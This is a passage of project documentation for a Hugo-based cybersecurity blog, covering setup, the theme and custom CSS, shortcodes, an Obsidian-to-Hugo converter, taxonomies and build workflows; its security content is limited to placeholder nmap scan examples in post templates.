# PROJECT DOCUMENTATION
## Hri7hik H4cks - Hugo Cybersecurity Blog

---

**Version:** 2.0
**Last Updated:** November 2025
**Status:** Production Ready

---

## Table of Contents

1. [Introduction & Overview](#1-introduction--overview)
2. [Getting Started](#2-getting-started)
3. [Architecture & Design](#3-architecture--design)
4. [Content Creation](#4-content-creation)
5. [Development Workflows](#5-development-workflows)
6. [Customization Guide](#6-customization-guide)
7. [Features Reference](#7-features-reference)
8. [Taxonomy System](#8-taxonomy-system)
9. [Scripts & Automation](#9-scripts--automation)
10. [Deployment](#10-deployment)
11. [Troubleshooting](#11-troubleshooting)
12. [Best Practices](#12-best-practices)
13. [API Reference](#13-api-reference)
14. [Appendices](#14-appendices)

---

## 1. Introduction & Overview

### Project Purpose

Hri7hik H4cks is a professional cybersecurity blog built with Hugo static site generator. It's designed for security professionals, CTF enthusiasts, and penetration testers to share detailed walkthroughs, security research, and educational content.

### Key Features

#### Core Features
- **Static Site Generator**: Hugo for fast builds and excellent performance
- **PaperMod Theme**: Modern, clean design with dark cybersecurity theme
- **Dual Writing Modes**: Direct Hugo or Obsidian workflow with automated conversion
- **Custom Dark Theme**: Neon green/cyan accents optimized for cybersecurity content
- **WCAG AAA Accessibility**: Full keyboard navigation, focus indicators, 44px+ touch targets

#### Content Features
- **5 Custom Taxonomies**: categories, tags, difficulties, platforms, tools
- **Enhanced Components**: Difficulty badges, callout boxes, tool badges, code blocks
- **Hugo Shortcodes**: Custom shortcodes for easy content creation
- **Table of Contents**: Automatic generation for long posts
- **Copy Buttons**: JavaScript-powered code block copy functionality
- **Responsive Design**: Desktop, tablet, and mobile optimized

#### UI/UX Enhancements
- **Fluid Typography**: Uses `clamp()` for perfect scaling on all devices
- **Micro-interactions**: Smooth animations and hover effects
- **Page Transitions**: Fade-in animations on load
- **Visual Polish**: Professional dark theme with consistent spacing

### Tech Stack

- **Static Site Generator**: Hugo v0.152.2+
- **Theme**: PaperMod (git submodule)
- **Styling**: Custom CSS (725 lines) with CSS custom properties
- **JavaScript**: Copy buttons for code blocks
- **Python**: Obsidian-to-Hugo converter (pyyaml, python-frontmatter, Pillow)
- **Fonts**: Inter (headings/body) and JetBrains Mono (code)

### Project Structure

```
/home/hrithik/gemini/Hri7hik_H4cks/
├── archetypes/              # Hugo post templates
│   ├── ctf-walkthrough.md   # CTF template
│   └── tutorial.md          # Tutorial template
├── assets/                  # Static assets
│   ├── css/
│   │   └── custom.css       # Custom styling (725 lines)
│   └── js/
│       └── copy-buttons.js  # Copy functionality
├── content/                 # Hugo content
│   ├── _index.md            # Homepage
│   ├── about.md             # About page
│   └── posts/               # Blog posts
├── hugo.toml                # Main configuration
├── config-development.toml  # Development override
├── scripts/                 # Automation
│   ├── workflow.sh          # Main workflow script
│   ├── obsidian_to_hugo_converter.py  # Python converter
│   └── config.yaml          # Converter configuration
├── layouts/shortcodes/      # Hugo shortcodes
│   ├── code.html            # Code blocks
│   ├── terminal.html        # Terminal blocks
│   ├── tool.html            # Tool badges
│   ├── difficulty.html      # Difficulty badges
│   ├── callout.html         # Callout boxes
│   └── image.html           # Image wrappers
├── obsidian-vault/          # Obsidian source files
│   └── posts/               # Write here!
├── themes/PaperMod/         # Hugo theme
├── requirements.txt         # Python dependencies
├── public/                  # Generated site (build output)
└── documentation files...
```

---

## 2. Getting Started

### Prerequisites

#### Required Software
- **Hugo**: v0.152.2 or higher
- **Python**: 3.7 or higher
- **Git**: For theme submodule

#### Python Dependencies
Install required packages:
```bash
pip3 install -r requirements.txt
```

This installs:
- `pyyaml` - YAML configuration parsing
- `python-frontmatter` - Front matter handling
- `Pillow` - Image processing and optimization
- `markdown` - Enhanced markdown processing

### Installation Steps

#### 1. Clone the Repository
```bash
git clone <your-repo-url>
cd Hri7hik_H4cks
```

#### 2. Initialize Git Submodules
```bash
git submodule update --init --recursive
```

#### 3. Install Dependencies
```bash
# Python dependencies
pip3 install -r requirements.txt

# Optional: inotify-tools for efficient file watching
sudo apt-get install inotify-tools  # Debian/Ubuntu
```

#### 4. Setup Directory Structure
```bash
./scripts/workflow.sh setup
```

This creates:
- `obsidian-vault/posts/` - Your Obsidian notes
- `obsidian-vault/attachments/` - Images and files
- `static/images/` - Optimized images

### Quick Start Guide

#### Option 1: Obsidian Workflow (Recommended)

1. **Create a new post in Obsidian**:
   ```bash
   cp obsidian-templates/ctf-walkthrough.md obsidian-vault/posts/my-ctf.md
   ```

2. **Edit the file** in Obsidian app or any markdown editor

3. **Convert to Hugo**:
   ```bash
   ./scripts/workflow.sh convert
   ```

4. **Preview the site**:
   ```bash
   ./scripts/workflow.sh serve
   ```

5. **Visit**: http://localhost:1313

#### Option 2: Direct Hugo Mode

1. **Create a new post**:
   ```bash
   hugo new posts/my-post.md --kind ctf-walkthrough
   ```

2. **Edit the post** in `content/posts/my-post.md`

3. **Start development server**:
   ```bash
   hugo server -D
   ```

### First Post Creation

#### Using Obsidian Template

```bash
# Copy the CTF walkthrough template
cp obsidian-templates/ctf-walkthrough.md obsidian-vault/posts/my-first-ctf.md
```

Edit the template and fill in:
- CTF name and machine name
- Platform (HackTheBox, TryHackMe, etc.)
- Difficulty level
- Target IP and objectives
- Reconnaissance steps
- Initial access method
- Privilege escalation
- Flag location

Then convert and preview:
```bash
./scripts/workflow.sh convert
./scripts/workflow.sh serve
```

#### Front Matter Format

Every post needs front matter:

```yaml
---
title: "Your Post Title"
date: YYYY-MM-DDTHH:MM:SSZ
draft: true/false
categories: ["CTF", "Tutorial", "Analysis"]
tags: ["tag1", "tag2"]
difficulties: ["beginner", "intermediate", "advanced"]
platforms: ["HackTheBox", "TryHackMe", "picoCTF"]
tools: ["nmap", "burp suite", "metasploit"]
description: "Brief description of the post"
---
```

### Verification

After setup, verify everything works:

```bash
# Check dependencies
./scripts/workflow.sh check

# Convert any existing notes
./scripts/workflow.sh convert

# Serve the site
./scripts/workflow.sh serve
```

Visit http://localhost:1313 to see your blog!

---

## 3. Architecture & Design

### System Architecture

The blog uses a multi-layered architecture:

```
┌─────────────────────────────────────────────────┐
│                 User/Browser                    │
└────────────────────┬────────────────────────────┘
                     │ HTTP Request
                     ▼
┌─────────────────────────────────────────────────┐
│              Hugo Static Site                   │
│          (Generated from Markdown)              │
│  - HTML pages  - CSS styling  - JavaScript     │
└────────────────────┬────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────┐
│              Content Layer                      │
│  ┌──────────────┐      ┌──────────────────┐   │
│  │ Hugo Format  │      │ Obsidian Format  │   │
│  │(content/)    │◄────►│(obsidian-vault/) │   │
│  └──────────────┘      └──────────────────┘   │
│         │                      │               │
│         └──────────┬───────────┘               │
│                    ▼                           │
│         ┌──────────────────────┐              │
│         │ Python Converter     │              │
│         │(obsidian_to_hugo_)   │              │
│         └──────────────────────┘              │
└────────────────────┬────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────┐
│              Theme Layer                        │
│  ┌──────────────────────────────────────────┐  │
│  │       PaperMod Theme                     │  │
│  │  (Base theme - don't modify)            │  │
│  └────────────┬─────────────────────────────┘  │
│               ▼                                │
│  ┌──────────────────────────────────────────┐  │
│  │   Custom CSS (custom.css)                │  │
│  │   - Dark cybersecurity theme             │  │
│  │   - Custom components                    │  │
│  │   - Responsive design                    │  │
│  └──────────────────────────────────────────┘  │
└─────────────────────────────────────────────────┘
```

### Theme System

#### PaperMod Integration
- **Location**: `themes/PaperMod/` (git submodule)
- **Purpose**: Base theme providing layouts, templates, and theme functionality
- **Rule**: Never modify files in `themes/PaperMod/` directly
- **Customization**: Use `assets/css/custom.css` for all customizations

#### Custom CSS Architecture

The custom CSS (725 lines) is organized into sections:

**Lines 1-100: Color Scheme & Variables**
```css
:root {
    --primary-color: #0a0e27;
    --secondary-color: #151b3d;
    --accent-color: #00ff88;
    --accent-secondary: #00d4ff;
    --text-color: #e4e4e7;
    /* ... more variables */
}
```

**Lines 101-300: Typography & Fluid Design**
```css
h1 { font-size: clamp(2rem, 5vw, 2.5rem); }
h2 { font-size: clamp(1.5rem, 4vw, 2rem); }
h3 { font-size: clamp(1.25rem, 3vw, 1.5rem); }
```

**Lines 301-450: Component Styling**
```css
/* Difficulty badges */
.difficulty-badge { /* ... */ }

/* Callout boxes */
.callout { /* ... */ }

/* Code blocks */
pre { /* ... */ }
```

**Lines 451-600: Responsive Design**
```css
/* Desktop */
@media (min-width: 1024px) { /* ... */ }

/* Tablet */
@media (max-width: 1024px) and (min-width: 769px) { /* ... */ }

/* Mobile */
@media (max-width: 768px) { /* ... */ }
```

**Lines 601-725+: Accessibility & Focus States**
```css
*:focus-visible { /* ... */ }
.skip-link { /* ... */ }
```

#### CSS Custom Properties

The theme uses CSS custom properties for:
- **Colors**: Consistent color palette
- **Typography**: Font families and sizes
- **Spacing**: Margins and padding
- **Focus**: Focus color and shadow for accessibility

### JavaScript Features

#### Copy Buttons (`assets/js/copy-buttons.js`)

**Functionality:**
- Automatically adds copy buttons to all `<pre><code>` blocks
- Provides visual feedback on copy success/failure
- Keyboard accessible (Enter/Space activation)
- Mobile-friendly with proper touch targets

**How It Works:**
```javascript
document.addEventListener('DOMContentLoaded', function() {
    addCopyButtons();
});

function addCopyButtons() {
    const codeBlocks = document.querySelectorAll('pre code');
    codeBlocks.forEach(codeBlock => {
        // Create copy button
        // Add event listeners
        // Handle clipboard API
        // Show feedback
    });
}
```

**Features:**
- Opacity changes on hover (0% → 70%)
- Success/failure visual feedback
- 2-second timeout for feedback messages
- Terminal-specific copy button handling

### Hugo Templates & Shortcodes

#### Shortcode System

Shortcodes are custom Hugo functions that generate HTML:

**1. Tool Badge** (`layouts/shortcodes/tool.html`)
```go
{{ $tool := .Get "tool" }}
<span class="tool-badge">{{ $tool }}</span>
```
**Usage**: `{{< tool tool="nmap" />}}`

**2. Difficulty Badge** (`layouts/shortcodes/difficulty.html`)
```go
{{ $level := .Get "level" | lower }}
<div class="difficulty-badge difficulty-{{ $level }}">
```
**Usage**: `{{< difficulty level="beginner" />}}`

**3. Callout Box** (`layouts/shortcodes/callout.html`)
```go
{{ $type := .Get "type" | default "info" }}
<div class="callout callout-{{ $type }}">
  <div class="callout-title">{{ $title }}</div>
  <div class="callout-content">{{ .Inner }}</div>
</div>
```
**Usage**: `{{< callout type="warning" title="Important" >}}Message{{< /callout >}}`

**4. Terminal Block** (`layouts/shortcodes/terminal.html`)
```go
<div class="terminal-block">
  <div class="terminal-header">
    <div class="terminal-title">Terminal</div>
  </div>
  <div class="terminal">
    <div class="prompt">$ {{ $command }}</div>
    <div class="output">{{ .Inner }}</div>
  </div>
</div>
```
**Usage**: `{{< terminal command="nmap -sC -sV 10.10.10.10" >}}Output{{< /terminal >}}`

**5. Code Block** (`layouts/shortcodes/code.html`)
```go
<div class="code-block-wrapper">
  <pre><code class="language-{{ $language }}">
```
**Usage**: `{{< code language="bash" >}}command{{< /code >}}`

### Configuration Files

#### `hugo.toml` - Main Configuration
- **baseURL**: Production domain
- **theme**: PaperMod
- **params**: Theme parameters
- **taxonomies**: 5 custom taxonomies
- **menu**: Navigation menu
- **markup**: Goldmark renderer with HTML enabled

#### `config-development.toml` - Development Override
- **baseURL**: localhost for development
- **env**: development
- Inherited all other settings from hugo.toml

#### `scripts/config.yaml` - Converter Settings
```yaml
# Source/destination paths
obsidian_vault: "./obsidian-vault"
hugo_content: "./content/posts"

# Image handling
auto_copy_images: true
optimize_images: true
image_max_width: 1200

# Front matter
create_missing_frontmatter: true
default_categories: ["General"]

# Auto-extraction
auto_extract_tools: true
auto_extract_platforms: true
auto_extract_difficulty: true
```

---

## 4. Content Creation

### Dual Writing Modes

The blog supports two content creation workflows:

#### Mode 1: Direct Hugo

Create posts directly in Hugo format:

```bash
# Create new CTF walkthrough
hugo new posts/my-ctf.md --kind ctf-walkthrough

# Create new tutorial
hugo new posts/tutorial.md --kind tutorial

# Edit the file
vim content/posts/my-ctf.md
```

**Advantages:**
- No conversion needed
- Direct control over front matter
- Hugo features work immediately

**When to Use:**
- Single, quick posts
- When you prefer working directly with Hugo
- For content that doesn't need Obsidian features

#### Mode 2: Obsidian Workflow (Recommended)

Write in Obsidian, auto-convert to Hugo:

```bash
# 1. Copy template
cp obsidian-templates/ctf-walkthrough.md obsidian-vault/posts/my-ctf.md

# 2. Edit in Obsidian or markdown editor
vim obsidian-vault/posts/my-ctf.md

# 3. Convert to Hugo
./scripts/workflow.sh convert

# 4. Preview
./scripts/workflow.sh serve
```

**Advantages:**
- Use Obsidian features (links, tags, graph, plugins)
- Better note organization
- Auto-extract tools, platforms, and difficulty
- Image optimization

**When to Use:**
- CTF walkthroughs (use obsidian-templates/ctf-walkthrough.md)
- Tutorials (use obsidian-templates/tutorial.md)
- Complex posts with many images
- When you want to leverage Obsidian's ecosystem

### Front Matter Format

All posts need front matter in YAML format:

```yaml
---
title: "Post Title"
date: 2025-11-02T10:30:00Z
draft: false
categories: ["CTF", "Tutorial", "Analysis", "General"]
tags: ["nmap", "enumeration", "web-app"]
difficulties: ["beginner", "intermediate", "advanced"]
platforms: ["HackTheBox", "TryHackMe", "picoCTF", "VulnHub", "General"]
tools: ["nmap", "burp suite", "metasploit", "sqlmap", "john"]
description: "Brief description (150-160 characters recommended)"
---
```

**Field Descriptions:**

| Field | Type | Required | Description | Example |
|-------|------|----------|-------------|---------|
| `title` | string | Yes | Post title | "HackTheBox Lame Walkthrough" |
| `date` | datetime | Yes | Publication date | "2025-11-02T10:30:00Z" |
| `draft` | boolean | No | Publish status | `false` (true = not published) |
| `categories` | array | No | Post categories | ["CTF", "Walkthrough"] |
| `tags` | array | No | Flexible tagging | ["nmap", "sql"] |
| `difficulties` | array | No | Difficulty levels | ["beginner"] |
| `platforms` | array | No | CTF platforms | ["HackTheBox"] |
| `tools` | array | No | Tools mentioned | ["nmap", "burp"] |
| `description` | string | No | SEO description | "Learn how to..." |

### Content Types & Templates

#### Hugo Archetypes (Direct Mode)

**CTF Walkthrough Template** (`archetypes/ctf-walkthrough.md`)
```yaml
---
title: "{{ replace .Name "-" " " | title }}"
date: {{ .Date }}
draft: true
categories: ["CTF", "Walkthrough"]
tags: [""]
difficulties: ["beginner", "intermediate", "advanced"]
platforms: ["HackTheBox", "TryHackMe", "picoCTF", "VulnHub"]
tools: [""]
description: "Complete walkthrough of this challenge"
---

<div class="difficulty-badge difficulty-beginner">Beginner Level</div>

## Introduction
Brief introduction...

## Initial Reconnaissance
### Port Scanning
```bash
nmap -sC -sV -oA scan [TARGET]
```

## Summary
```

**Tutorial Template** (`archetypes/tutorial.md`)
```yaml
---
title: "{{ replace .Name "-" " " | title }}"
date: {{ .Date }}
draft: true
categories: ["Tutorial"]
tags: [""]
difficulties: ["beginner", "intermediate", "advanced"]
tools: [""]
description: "Tutorial description"
---

## Introduction

## Prerequisites

## Step-by-Step Guide

## Conclusion
```

#### Obsidian Templates (Obsidian Mode)

**CTF Walkthrough Template** (`obsidian-templates/ctf-walkthrough.md`)
```markdown
# {CTF Name} - {Machine Name} Walkthrough

> [!info] Information
> **Platform:** {Platform Name}
> **Difficulty:** {Difficulty Level}
> **Target:** {Target IP}
> **Objective:** {Objective Description}

## Table of Contents

## Introduction

## Reconnaissance
> [!tip] Tip
> Use nmap for initial scanning.

```bash
nmap -sC -sV -oA initial_scan {Target IP}
```

## Initial Access

## Privilege Escalation

## Summary
```

**Other Obsidian Templates:**
- `security-analysis.md` - Security research templates
- `quick-reference.md` - Quick reference/cheat sheet templates

### Taxonomies Usage

The blog uses 5 custom taxonomies for content organization:

#### 1. Categories
**Purpose**: Broad content classification
**Values**: ["CTF", "Tutorial", "Analysis", "Walkthrough", "General"]
**Usage**:
```yaml
categories: ["CTF", "Walkthrough"]
```

#### 2. Tags
**Purpose**: Flexible keyword tagging
**Values**: Unlimited, user-defined
**Examples**: ["nmap", "enumeration", "sql-injection", "web-app"]
**Usage**:
```yaml
tags: ["nmap", "enumeration", "web-security"]
```

#### 3. Difficulties
**Purpose**: Skill level classification
**Values**: ["beginner", "intermediate", "advanced"]
**Usage**:
```yaml
difficulties: ["beginner"]
```

#### 4. Platforms
**Purpose**: CTF/training platform identification
**Values**: ["HackTheBox", "TryHackMe", "picoCTF", "VulnHub", "General"]
**Usage**:
```yaml
platforms: ["HackTheBox"]
```

#### 5. Tools
**Purpose**: Tool/software mentioned in content
**Values**: Any tool name
**Examples**: ["nmap", "burp suite", "metasploit", "sqlmap"]
**Usage**:
```yaml
tools: ["nmap", "burp suite", "metasploit"]
```

### Obsidian to Hugo Conversion

The Python converter automatically handles:

#### Syntax Conversions
```markdown
# Obsidian syntax
[[Wiki Link]] → Hugo: [Wiki Link](/wiki-link/)

> [!info] Title → Hugo: <div class="callout callout-info">
> Content → Hugo: <div class="callout-content">Content</div>
```

#### Image Handling
- Copies images from `obsidian-vault/attachments/` to `static/images/`
- Optimizes images (max width 1200px, JPEG format)
- Updates markdown links to point to new location

#### Front Matter Generation
- Auto-generates missing front matter from filename
- Extracts tools, platforms, and difficulty from content
- Creates title from filename (hyphens → spaces)

#### Configuration
Edit `scripts/config.yaml` to customize conversion:
```yaml
# Auto-extraction
auto_extract_tools: true        # Extract tools from content
auto_extract_platforms: true    # Extract platforms
auto_extract_difficulty: true   # Extract difficulty

# Image handling
optimize_images: true           # Optimize images
image_max_width: 1200           # Max width in pixels
image_quality: 85               # JPEG quality (1-100)

# Front matter
create_missing_frontmatter: true
default_categories: ["General"]
default_difficulties: ["beginner"]
```

---

## 5. Development Workflows

### Local Development

#### Quick Start (Obsidian Workflow)

```bash
# 1. Initial setup (first time only)
./scripts/workflow.sh setup

# 2. Convert Obsidian notes to Hugo
./scripts/workflow.sh convert

# 3. Start development server
./scripts/workflow.sh serve
```

Server runs at **http://localhost:1313** with:
- Live reload on changes
- localhost URLs (not production domain)
- Draft content visible
- Future/expired posts included

#### Development Server Options

**Full Command:**
```bash
hugo server \
  --config hugo.toml,config-development.toml \  # Use dev config
  --buildDrafts \                                # Include drafts
  --buildExpired \                               # Include expired
  --buildFuture \                                # Include future posts
  --disableFastRender \                          # Full rebuild on changes
  --bind 0.0.0.0 \                               # Accessible from network
  --port 1313                                    # Port
```

**Hugo Options Explained:**
- `--config`: Merge hugo.toml with config-development.toml
- `--buildDrafts`: Include posts with `draft: true`
- `--buildFuture`: Include posts with future dates
- `--buildExpired`: Include expired posts
- `--disableFastRender`: Force full rebuild (important for shortcodes)

#### Direct Hugo Workflow

```bash
# Create new post
hugo new posts/my-post.md

# Edit post
vim content/posts/my-post.md

# Start server with drafts
hugo server -D
```

### Watching for Changes

#### Auto-Convert Mode (Obsidian)

**Watch Mode:**
```bash
./scripts/workflow.sh watch
```

**How It Works:**
1. Monitors `obsidian-vault/posts/` for changes
2. Auto-converts modified files to Hugo
3. Hugo live reload detects changes and rebuilds
4. Browser auto-refreshes

**Implementation:**
- Uses `inotifywait` if available (efficient)
- Falls back to polling every 5 seconds
- Only processes `.md` files

**Benefits:**
- Zero manual steps
- Instant preview
- Efficient resource usage

#### Manual Mode

```bash
# Edit Obsidian file
vim obsidian-vault/posts/my-ctf.md

# Convert to Hugo
./scripts/workflow.sh convert

# Hugo auto-rebuilds via live reload
```

### Building for Production

#### Standard Build

```bash
# Build site
./scripts/workflow.sh build

# Output location
public/          # Generated static site
```

**Build Command:**
```bash
hugo \
  --minify \                    # Minify HTML, CSS, JS
  --buildExpired \              # Include expired posts
  --buildFuture                 # Include future posts
```

**Production Features:**
- Minified CSS, HTML, JavaScript
- Optimized images
- All posts included (past, present, future)
- Production URLs (from hugo.toml baseURL)

#### Manual Hugo Build

```bash
# Using main config (production)
hugo --minify --buildExpired --buildFuture

# Using specific config
hugo --config hugo.toml --minify

# Quiet mode (less output)
hugo --quiet

# Check build
ls -lah public/posts/
```

### Converting Obsidian Notes

#### Single Conversion

```bash
# Convert all Obsidian notes
./scripts/workflow.sh convert

# Or use Python directly
python3 scripts/obsidian_to_hugo_converter.py \
  --source ./obsidian-vault \
  --output ./content/posts
```

#### Conversion Process

1. **Read** Obsidian markdown files from `obsidian-vault/posts/`
2. **Extract** front matter (if exists)
3. **Convert** syntax:
   - `[[Wiki Links]]` → `[Wiki Links](/wiki-links/)`
   - `> [!type] Title` → `<div class="callout callout-type">`
4. **Process** images:
   - Copy to `static/images/`
   - Optimize to max 1200px width
   - Update markdown references
5. **Generate** front matter if missing
6. **Extract** metadata (tools, platforms, difficulty)
7. **Write** to `content/posts/`

#### Converter Options

```python
# Custom source/output
python3 scripts/obsidian_to_hugo_converter.py \
  --source ./my-vault \
  --output ./content

# Custom config
python3 scripts/obsidian_to_hugo_converter.py \
  --config ./custom-config.yaml

# Verbose output
python3 scripts/obsidian_to_hugo_converter.py --verbose
```

### Workflow Examples

#### Daily Workflow (Obsidian)

```bash
# Morning: Start watching for changes
./scripts/workflow.sh watch

# Write/edit in Obsidian (auto-converts)

# Preview at http://localhost:1313

# When ready to publish:
# 1. Set draft: false in front matter
# 2. Stop watch mode (Ctrl+C)
# 3. Build for production
./scripts/workflow.sh build
```

#### Publishing Workflow

```bash
# 1. Final review
./scripts/workflow.sh convert
./scripts/workflow.sh serve

# 2. Edit post and set draft: false
vim content/posts/my-post.md

# 3. Build production site
./scripts/workflow.sh build

# 4. Verify build
ls -lah public/posts/my-post/

# 5. Deploy public/ to hosting
```

#### Team Workflow

```bash
# Setup
git clone <repo>
git submodule update --init
pip3 install -r requirements.txt
./scripts/workflow.sh setup

# Daily work
# Option A: Use Obsidian and convert
cp obsidian-templates/*.md obsidian-vault/posts/
./scripts/workflow.sh convert
./scripts/workflow.sh serve

# Option B: Direct Hugo
hugo new posts/post.md --kind ctf-walkthrough
vim content/posts/post.md
hugo server -D

# Before committing
./scripts/workflow.sh build
git add .
git commit -m "Add new CTF walkthrough"
git push
```

---

## 6. Customization Guide

### Styling Customization

#### Update Site Info

**Edit `hugo.toml`:**

```toml
# Line 1: Base URL
baseURL = 'https://yourdomain.com/'

# Line 3: Site title
title = 'Your Blog Name'

# Line 24: Description
description = "Your site description"

# Line 27: Author
author = "Your Name"

# Lines 33-35: Social links
socialIcons = [
  { name = "github", url = "https://github.com/yourusername" },
  { name = "linkedin", url = "https://linkedin.com/in/yourprofile" },
  { name = "twitter", url = "https://twitter.com/yourusername" }
]
```

#### Modify Color Scheme

**Edit `assets/css/custom.css` lines 1-20:**

```css
:root {
    /* Primary colors */
    --primary-color: #0a0e27;        /* Background dark blue */
    --secondary-color: #151b3d;      /* Slightly lighter blue */
    --tertiary-color: #1e2749;       /* Card background */

    /* Accent colors */
    --accent-color: #00ff88;         /* Neon green */
    --accent-secondary: #00d4ff;     /* Cyan */

    /* Text colors */
    --text-color: #e4e4e7;           /* Primary text */
    --text-secondary: #a1a1aa;       /* Secondary text */
    --text-muted: #71717a;           /* Muted text */

    /* Status colors */
    --success-color: #00ff88;        /* Success/positive */
    --warning-color: #fbbf24;        /* Warnings */
    --danger-color: #ff4444;         /* Danger/critical */
    --info-color: #00d4ff;           /* Information */

    /* Focus */
    --focus-color: #00d4ff;          /* Focus outline */
    --shadow-color: rgba(0, 212, 255, 0.3);  /* Focus glow */
}
```

**Example: Purple Theme**
```css
:root {
    --primary-color: #1a0b2e;
    --secondary-color: #2d1b4e;
    --accent-color: #9d4edd;
    --accent-secondary: #c77dff;
    --focus-color: #c77dff;
    --shadow-color: rgba(199, 125, 255, 0.3);
}
```

#### Typography Customization

**Font Families** (hugo.toml lines 38-39):
```toml
[params.assets]
googleFonts = ["JetBrains Mono:400,500,600", "Inter:400,500,600,700"]
```

Change fonts:
```toml
googleFonts = ["Fira Code:400,500,600", "Roboto:400,500,600,700"]
```

**Font Sizes** (custom.css lines 54-70):
```css
h1 { font-size: clamp(2rem, 5vw, 2.5rem); }
h2 { font-size: clamp(1.5rem, 4vw, 2rem); }
h3 { font-size: clamp(1.25rem, 3vw, 1.5rem); }
```

Customize:
```css
h1 { font-size: clamp(2.5rem, 6vw, 3rem); }
h2 { font-size: clamp(2rem, 5vw, 2.5rem); }
h3 { font-size: clamp(1.5rem, 4vw, 1.75rem); }
```

#### Component Styling

**Difficulty Badges** (custom.css lines 300-350):
```css
.difficulty-badge {
    display: inline-block;
    padding: 0.4rem 0.8rem;
    border-radius: 4px;
    font-weight: 600;
    font-size: 0.875rem;
    transition: all 0.3s ease;
}

.difficulty-beginner {
    background-color: rgba(0, 255, 136, 0.2);
    color: var(--success-color);
    border: 1px solid var(--success-color);
}
```

**Custom Badge Style:**
```css
.difficulty-badge {
    padding: 0.6rem 1.2rem;           /* Larger */
    border-radius: 50px;              /* Pill shape */
    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);  /* Shadow */
}
```

**Callout Boxes** (custom.css lines 400-450):
```css
.callout {
    padding: 1.25rem;
    border-radius: 8px;
    margin: 1.5rem 0;
    border-left: 4px solid;
    background-color: var(--tertiary-color);
}

.callout-info {
    border-left-color: var(--info-color);
}
```

**Custom Callout:**
```css
.callout {
    position: relative;               /* For pseudo-elements */
    padding: 1.5rem;                  /* More padding */
}

.callout::before {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    right: 0;
    height: 4px;
    background: linear-gradient(90deg, var(--accent-color), var(--accent-secondary));
}
```

### Adding New Shortcodes

#### Create a Shortcode

**Step 1: Create HTML template** (`layouts/shortcodes/note.html`)
```html
<div class="custom-note">
    <div class="note-icon">📌</div>
    <div class="note-content">
        {{ .Inner }}
    </div>
</div>
```

**Step 2: Style it** (custom.css)
```css
.custom-note {
    display: flex;
    align-items: flex-start;
    gap: 1rem;
    padding: 1rem;
    background: var(--tertiary-color);
    border-radius: 8px;
    border: 1px solid var(--border-color);
}

.note-icon {
    font-size: 1.5rem;
}

.note-content {
    flex: 1;
}
```

**Step 3: Use it**
```markdown
{{< note >}}This is a custom note{{< /note >}}
```

#### Advanced Shortcode with Parameters

**Template** (`layouts/shortcodes/badge.html`):
```html
{{ $text := .Get "text" | default "Badge" }}
{{ $color := .Get "color" | default "blue" }}
{{ $icon := .Get "icon" }}

<span class="custom-badge color-{{ $color }}">
    {{ if $icon }}{{ $icon }} {{ end }}
    {{ $text }}
</span>
```

**Usage:**
```markdown
{{< badge text="Important" color="red" icon="⚠️" />}}
```

**Output:**
```html
<span class="custom-badge color-red">
    ⚠️ Important
</span>
```

#### Conditional Shortcode

**Template** (`layouts/shortcodes/privcheck.html`):
```html
{{ $level := .Get "level" | lower }}

{{ if eq $level "easy" }}
<div class="callout callout-success">
    This is easy mode!
</div>
{{ else if eq $level "hard" }}
<div class="callout callout-danger">
    This is hard mode!
</div>
{{ else }}
<div class="callout callout-info">
    This is normal mode.
</div>
{{ end }}
```

**Usage:**
```markdown
{{< privcheck level="easy" />}}
```

### Creating Custom Templates

#### New Archetype

**Create** `archetypes/security-analysis.md`:
```yaml
---
title: "{{ replace .Name "-" " " | title }}"
date: {{ .Date }}
draft: true
categories: ["Security Analysis"]
tags: [""]
difficulties: ["beginner", "intermediate", "advanced"]
tools: [""]
description: "Security analysis of topic"
---

# Security Analysis: {Topic}

## Executive Summary

## Methodology

## Findings

## Recommendations

## References
```

**Use it:**
```bash
hugo new posts/analysis.md --kind security-analysis
```

#### Custom Layout

**Create** `layouts/posts/custom-layout.html`:
```html
{{ define "main" }}
<article class="post custom-post">
    <header class="post-header">
        <h1>{{ .Title }}</h1>
        <div class="post-meta">
            <span>📅 {{ .Date.Format "Jan 2, 2006" }}</span>
            <span>⏱️ {{ .ReadingTime }} min read</span>
        </div>
    </header>

    <div class="post-content">
        {{ .Content }}
    </div>

    <footer class="post-footer">
        {{ with .Params.tags }}
        <div class="post-tags">
            {{ range . }}
            <span class="tag">{{ . }}</span>
            {{ end }}
        </div>
        {{ end }}
    </footer>
</article>
{{ end }}
```

### Modifying Taxonomies

#### Add New Taxonomy

**Edit hugo.toml:**
```toml
[taxonomies]
  tag = "tags"
  category = "categories"
  difficulty = "difficulties"
  platform = "platforms"
  tool = "tools"
  # Add new taxonomy
  series = "series"
  cert = "certifications"
```

**Use in front matter:**
```yaml
---
title: "My Post"
series: ["Advanced Penetration Testing"]
cert: ["OSCP", "CEH"]
---
```

#### Customize Taxonomy Display

**Edit** `layouts/_default/terms.html` (for taxonomy pages):
```html
{{ define "main" }}
<h1>{{ .Title }}</h1>

<div class="taxonomy-list">
    {{ range .Data.Terms.Alphabetical }}
    <div class="taxonomy-item">
        <h2>
            <a href="{{ .Page.RelPermalink }}">
                {{ .Page.Title }}
            </a>
            <span class="count">{{ len .Pages }}</span>
        </h2>
    </div>
    {{ end }}
</div>
{{ end }}
```

### Theme Configuration

#### Enable/Disable PaperMod Features

**Edit hugo.toml:**
```toml
[params]
  showtoc = true                    # Table of contents
  showReadingTime = true            # Reading time
  showWordCount = true              # Word count
  displayFullName = true            # Full author name
  defaultTheme = "dark"             # Dark theme default
  customCSS = ["css/custom.css"]    # Include custom CSS

[params.homeInfoParams]
  title = "Your Title"
  subtitle = "Your subtitle"
  content = "Welcome message..."

[params.label]
  text = "Blog Name"
  icon = "/favicon.ico"
  iconHeight = 35

[params.editPost]
  URL = "https://github.com/user/repo/edit/main/content"
  Text = "Suggest Changes"
  iconText = "✏️"
```

#### Menu Configuration

**Add to hugo.toml:**
```toml
[menu]
  [[menu.main]]
    name = "Posts"
    url = "/posts"
    weight = 1
  [[menu.main]]
    name = "About"
    url = "/about"
    weight = 2
  [[menu.main]]
    name = "Categories"
    url = "/categories/"
    weight = 3
  [[menu.main]]
    name = "Tags"
    url = "/tags/"
    weight = 4
```

---

## 7. Features Reference

### Difficulty Badges

#### Purpose
Display skill level required for content at a glance.

#### Levels
- **Beginner**: Green badge, for introductory content
- **Intermediate**: Yellow/Orange badge, for moderate difficulty
